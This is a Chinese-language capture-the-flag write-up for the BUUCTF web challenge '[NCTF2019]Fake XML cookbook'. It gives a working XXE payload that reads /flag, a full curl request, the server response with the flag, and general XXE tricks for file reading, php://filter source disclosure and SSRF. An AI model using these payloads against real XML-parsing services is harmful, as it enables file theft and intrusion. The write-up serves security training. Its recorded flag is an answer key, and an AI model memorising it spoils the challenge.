---
title: "[NCTF2019]Fake XML cookbook"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [xxe, xml-injection, file-read]
vulnerability: XXE 注入漏洞，服务端解析 XML 时未禁用外部实体，导致任意文件读取
solved: true
flag: "flag{9d0c0946-e258-4186-93a3-ab16d86de5bd}"
---

# [NCTF2019]Fake XML cookbook

## 题目概述
一个登录页面，题目名称 "Fake XML" 暗示 XML 相关漏洞。

## 信息收集
1. 访问页面，查看源码发现登录功能使用 AJAX 发送 XML 数据
2. 关键 JS 代码：
```javascript
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
$.ajax({
    type: "POST",
    url: "doLogin.php",
    contentType: "application/xml;charset=utf-8",
    data: data,
    ...
});
```
3. 服务端接收 XML 格式数据并解析返回结果

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：XXE (XML External Entity) 注入
- **原理**：服务端解析 XML 时未禁用外部实体（DTD），攻击者可通过定义外部实体读取服务器本地文件或发起 SSRF 攻击
- **判断过程**：
  1. 题目名 "Fake XML" 暗示 XML 相关漏洞
  2. 登录请求发送 XML 格式数据
  3. Content-Type 为 `application/xml`，服务端会解析 XML

## 利用过程（Payload + Flag）

**Payload：**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>test</password></user>
```

**请求命令：**
```bash
curl -s -X POST "http://target/doLogin.php" \
  -H "Content-Type: application/xml;charset=utf-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>test</password></user>'
```

**响应：**
```xml
<result><code>0</code><msg>flag{9d0c0946-e258-4186-93a3-ab16d86de5bd}
</msg></result>
```

## 复现步骤
1. 访问题目页面，发现登录表单
2. 查看页面源码，发现登录请求发送 XML 数据到 `doLogin.php`
3. 构造 XXE Payload，定义外部实体读取 `/flag` 文件
4. 发送恶意 XML 请求，在响应中获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| XXE 注入 | doLogin.php XML 解析 | `<!ENTITY xxe SYSTEM "file:///flag">` | XML DTD 外部实体定义 |

## 知识总结（解题技巧、同类题型套路）
1. **题目命名提示**：题目名含 "XML" 时优先考虑 XXE
2. **识别 XXE 场景**：Content-Type 为 `application/xml` 或请求体为 XML 格式
3. **常见 flag 位置**：`/flag`、`/flag.txt`、`/var/www/html/flag.php` 等
4. **XXE 利用方式**：
   - 直接文件读取：`file:///path`
   - PHP 伪协议：`php://filter/...`（读取 PHP 源码）
   - SSRF：`http://internal-server`
